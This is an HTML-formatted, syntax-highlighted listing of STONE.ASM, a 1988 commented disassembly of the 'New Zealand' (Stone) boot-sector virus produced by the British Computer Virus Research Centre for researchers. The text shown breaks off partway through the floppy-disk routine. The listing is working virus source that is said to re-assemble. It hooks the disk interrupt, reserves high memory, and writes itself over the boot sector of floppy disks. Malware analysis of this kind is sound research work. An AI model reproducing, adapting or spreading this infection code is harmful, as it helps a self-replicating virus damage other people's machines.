<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>STONE.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; IMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM;</span><span class="sc0">
</span><span class="sc1">; :                 British Computer Virus Research Centre                   :</span><span class="sc0">
</span><span class="sc1">; :  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    :</span><span class="sc0">
</span><span class="sc1">; :  Telephone:     Domestic   0273-26105,   International  +44-273-26105    :</span><span class="sc0">
</span><span class="sc1">; :                                                                          :</span><span class="sc0">
</span><span class="sc1">; :                         The 'New Zealand' Virus                          :</span><span class="sc0">
</span><span class="sc1">; :                Disassembled by Joe Hirst,   November 1988                :</span><span class="sc0">
</span><span class="sc1">; :                                                                          :</span><span class="sc0">
</span><span class="sc1">; :                   Copyright (c) Joe Hirst 1988, 1989.                    :</span><span class="sc0">
</span><span class="sc1">; :                                                                          :</span><span class="sc0">
</span><span class="sc1">; :      This listing is only to be made available to virus researchers      :</span><span class="sc0">
</span><span class="sc1">; :                or software writers on a need-to-know basis.              :</span><span class="sc0">
</span><span class="sc1">; HMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM&lt;</span><span class="sc0">
 
        </span><span class="sc1">; The virus consists of a boot sector only.  The original boot sector</span><span class="sc0">
        </span><span class="sc1">; is kept at track zero, head one, sector three on a floppy disk, or</span><span class="sc0">
        </span><span class="sc1">; track zero, head zero, sector two on a hard disk.</span><span class="sc0">
 
        </span><span class="sc1">; The disassembly has been tested by re-assembly using MASM 5.0.</span><span class="sc0">
 
        </span><span class="sc1">; The program requires an origin address of 7C00H, as it is designed</span><span class="sc0">
        </span><span class="sc1">; to load and run as a boot sector.</span><span class="sc0">
 
</span><span class="sc5">RAM</span><span class="sc0">     </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc9">AT</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 
        </span><span class="sc1">; System data</span><span class="sc0">
 
        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">4CH</span><span class="sc0">
</span><span class="sc5">BW004C</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; Interrupt 19 (13H) offset</span><span class="sc0">
</span><span class="sc5">BW004E</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; Interrupt 19 (13H) segment</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">413H</span><span class="sc0">
</span><span class="sc5">BW0413</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; Total RAM size</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">440H</span><span class="sc0">
</span><span class="sc5">BB0440</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; Motor timeout counter</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">46CH</span><span class="sc0">
</span><span class="sc5">BB046C</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; System clock</span><span class="sc0">
 
        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">7C0AH</span><span class="sc0">
</span><span class="sc5">I13_OF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">I13_SG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">HICOOF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">HICOSG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; High core segment</span><span class="sc0">
 
</span><span class="sc5">RAM</span><span class="sc0">     </span><span class="sc9">ENDS</span><span class="sc0">
 
</span><span class="sc5">CODE</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PUBLIC</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
        </span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">RAM</span><span class="sc0">
 
</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAH</span><span class="sc0">                    </span><span class="sc1">; Far jump to next byte</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">BP0010</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07C0H</span><span class="sc0">
 
</span><span class="sc5">BP0010</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">BP0110</span><span class="sc0">
 
</span><span class="sc5">DRIVEN</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; Drive number (A=0, B=1, C=2)</span><span class="sc0">
</span><span class="sc5">DUMMY</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
 
</span><span class="sc1">;               Original Int 13H address</span><span class="sc0">
 
</span><span class="sc5">INT_13</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
 
</span><span class="sc1">;               Branch address in high core</span><span class="sc0">
 
</span><span class="sc5">HIGHCO</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">BP0120</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
 
</span><span class="sc1">;               Boot sector processing address</span><span class="sc0">
 
</span><span class="sc5">BOOTST</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">07C00H</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
 
</span><span class="sc1">;               Interrupt 13H disk I/O routine</span><span class="sc0">
 
</span><span class="sc5">BP0020</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; Sub-function 2</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">BP0030</span><span class="sc0">                  </span><span class="sc1">; Pass on if below</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; Sub-function 4</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">BP0030</span><span class="sc0">                  </span><span class="sc1">; Pass on if not below</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; Is drive A</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">BP0030</span><span class="sc0">                  </span><span class="sc1">; Pass on if not</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; \ Segment zero</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; /</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">BB0440</span><span class="sc0">               </span><span class="sc1">; Get motor timeout counter</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">                   </span><span class="sc1">; Test for zero</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">BP0030</span><span class="sc0">                  </span><span class="sc1">; Branch if not</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0040</span><span class="sc0">                  </span><span class="sc1">; Call infection routine</span><span class="sc0">
</span><span class="sc5">BP0030</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">INT_13</span><span class="sc0">                  </span><span class="sc1">; Pass control to Int 13H</span><span class="sc0">
 
</span><span class="sc1">;               Infection routine</span><span class="sc0">
 
</span><span class="sc5">BP0040</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; Retry count</span><span class="sc0">
</span><span class="sc5">BP0050</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">201H</span><span class="sc0">                 </span><span class="sc1">; Read one sector</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">                      </span><span class="sc1">; \ Set ES to CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; /</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">200H</span><span class="sc0">                 </span><span class="sc1">; Boot sector buffer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; Track zero, sector 1</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                   </span><span class="sc1">; Head zero, drive A</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">                           </span><span class="sc1">; Fake an interrupt</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">INT_13</span><span class="sc0">                  </span><span class="sc1">; Call Int 13H</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">BP0060</span><span class="sc0">                  </span><span class="sc1">; Branch if no error</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; Reset disk sub-system</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">                           </span><span class="sc1">; Fake an interrupt</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">INT_13</span><span class="sc0">                  </span><span class="sc1">; Call Int 13H</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">                      </span><span class="sc1">; Decrement retry count</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">BP0050</span><span class="sc0">                  </span><span class="sc1">; Retry</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">BP0080</span><span class="sc0">                  </span><span class="sc1">; No more retries</span><span class="sc0">
 
</span><span class="sc5">BP0060</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">                   </span><span class="sc1">; Start of program</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">200H</span><span class="sc0">                 </span><span class="sc1">; Boot sector buffer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Get first word</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Test if same</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">BP0070</span><span class="sc0">                  </span><span class="sc1">; Install if not</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Get second word</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Test if same</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">BP0070</span><span class="sc0">                  </span><span class="sc1">; Install if not</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">BP0080</span><span class="sc0">                  </span><span class="sc1">; Pass on</span><span class="sc0">
 
</span><span class="sc5">BP0070</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">301H</span><span class="sc0">                 </span><span class="sc1">; Write one sector</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">200H</span><span class="sc0">                 </span><span class="sc1">; Boot sector buffer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; Track zero, sector 3</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">100H</span><span class="sc0">                 </span><span class="sc1">; Head 1, drive A</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">                           </span><span class="sc1">; Fake an interrupt</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">INT_13</span><span class="sc0">                  </span><span class="sc1">; Call Int 13H</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">BP0080</span><span class="sc0">                  </span><span class="sc1">; Branch if error</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">301H</span><span class="sc0">                 </span><span class="sc1">; Write one sector</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">; This sector</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; Track zero, sector 1</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                   </span><span class="sc1">; Head zero, drive A</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">                           </span><span class="sc1">; Fake an interrupt</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">INT_13</span><span class="sc0">                  </span><span class="sc1">; Call Int 13H</span><span class="sc0">
</span><span class="sc5">BP0080</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
 
</span><span class="sc1">;               Display message</span><span class="sc0">
 
</span><span class="sc5">BP0090</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Get next message byte</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; Update pointer</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; Test for end of message</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">BP0100</span><span class="sc0">                  </span><span class="sc1">; Branch to display</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
 
</span><span class="sc5">BP0100</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0EH</span><span class="sc0">                  </span><span class="sc1">; Write TTY mode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">                     </span><span class="sc1">; VDU I/O</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">BP0090</span><span class="sc0">            </span><span class="sc1">; Process next byte</span><span class="sc0">
 
</span><span class="sc1">;               Install in high core</span><span class="sc0">
 
</span><span class="sc5">BP0110</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; \ Segment zero</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; /</span><span class="sc0">
        </span><span class="sc6">CLI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; \ Set stack to boot sector area</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc2">7C00H</span><span class="sc0">                </span><span class="sc1">; /</span><span class="sc0">
        </span><span class="sc6">STI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW004C</span><span class="sc0">               </span><span class="sc1">; Get Int 13H offset</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">I13_OF</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">; Store in jump offset</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW004E</span><span class="sc0">               </span><span class="sc1">; Get Int 13H segment</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">I13_SG</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">; Store in jump segment</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0413</span><span class="sc0">               </span><span class="sc1">; Get total RAM size</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; \ Subtract 2k</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; /</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">BW0413</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">; Replace total RAM size</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                    </span><span class="sc1">; Bits to move</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">                   </span><span class="sc1">; Convert to Segment</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; Set ES to segment</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">HICOSG</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">; Move segment to jump address</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0020</span><span class="sc0">        </span><span class="sc1">; Get Int 13H routine address</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">BW004C</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">               </span><span class="sc1">; Set new Int 13H offset</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">BW004E</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">               </span><span class="sc1">; Set new Int 13H segment</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">        </span><span class="sc1">; Load length of program</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">                      </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">                      </span><span class="sc1">; /</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">                   </span><span class="sc1">; \ Set pointers to zero</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">                   </span><span class="sc1">; /</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">                   </span><span class="sc1">; Copy program to high core</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">HIGHCO</span><span class="sc0">                  </span><span class="sc1">; Branch to next instruc in high core</span><span class="sc0">
 
</span><span class="sc1">;               Continue processing in high core</span><span class="sc0">
 
</span><span class="sc5">BP0120</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; Reset disk sub-system</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13H</span><span class="sc0">                     </span><span class="sc1">; Disk I/O</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; \ Segment zero</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; /</span><span class="sc0">
        </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">RAM</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">201H</span><span class="sc0">                 </span><span class="sc1">; Read one sector</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">7C00H</span><span class="sc0">                </span><span class="sc1">; Boot sector buffer address</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc5">DRIVEN</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; Test drive is A</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">BP0130</span><span class="sc0">                  </span><span class="sc1">; Branch if yes</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; Track zero, sector 2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                  </span><span class="sc1">; Side zero, drive C</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13H</span><span class="sc0">                     </span><span class="sc1">; Disk I/O</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">BP0150</span><span class="sc0">                  </span><span class="sc1">; Pass control to boot sector</span><span class="sc0">
 
</span><span class="sc1">;               Floppy disk</span><span class="sc0">
 
